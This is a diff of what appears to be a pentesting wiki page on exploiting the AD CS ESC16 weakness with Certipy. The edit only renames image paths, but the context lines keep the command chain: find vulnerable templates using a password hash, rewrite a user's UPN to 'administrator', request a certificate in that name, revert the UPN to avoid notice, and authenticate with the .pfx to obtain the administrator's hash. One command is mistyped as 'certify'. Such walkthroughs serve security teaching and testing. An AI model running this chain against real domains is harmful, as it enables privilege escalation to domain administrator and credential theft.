@@ -25,7 +25,7 @@ certipy find -u 'user@domain.com' -hashes 'HASH' -dc-ip IP -vulnerable -enabled
 ```
 {% endcode %}
 
-<figure><img src="../../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### **Exploitation of ESC16 Vulnerability Using Certipy**
 
@@ -37,7 +37,7 @@ certipy account -u 'USER' -p 'PASS' -target 'DC.domain.com' -dc-ip IP -upn 'admi
 ```
 {% endcode %}
 
-<figure><img src="../../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
 
 This allows the user to request certificates for the `administrator` identity.
 
@@ -47,7 +47,7 @@ This allows the user to request certificates for the `administrator` identity.
 certipy account -u 'USER' -p 'PASS' -dc-ip IP -u 'MOD_USER' read
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now the UPN is set to `administrator` .
 
@@ -59,7 +59,7 @@ certipy req -dc-ip IP -u 'administrator' -p 'USER_PASS' -target 'DC.domain.com' 
 ```
 {% endcode %}
 
-<figure><img src="../../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
 
 4. **Revert the UPN change** to prevent suspiciuos or disruption.
 
@@ -69,7 +69,7 @@ certify account -u 'USER' -p 'PASS' -target 'DC.domain.com' -dc-ip IP -upn 'USER
 ```
 {% endcode %}
 
-<figure><img src="../../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -81,5 +81,5 @@ Once we obtained the `administrator.pfx` certificate, we can use it to get his h
 certipy auth -pfx administrator.pfx -domain 'domain.com' -dc-ip IP 
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>
 
